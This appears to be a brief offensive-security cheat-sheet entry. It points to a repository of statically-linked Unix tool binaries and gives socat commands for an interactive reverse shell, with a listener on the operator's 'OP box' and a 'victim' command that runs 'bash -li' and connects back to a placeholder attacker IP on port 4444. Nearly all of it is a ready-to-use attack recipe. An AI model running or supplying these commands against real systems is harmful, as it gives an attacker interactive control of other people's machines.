```
Find and download static binary:
[andrew-d/static-binaries: Various *nix tools built as statically-linked binaries](https://github.com/andrew-d/static-binaries)
```

# Get interactive shell
```
On OP box:
socat file:`tty`,raw,echo=0 tcp-listen:4444

On victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<OP box IP>:4444
```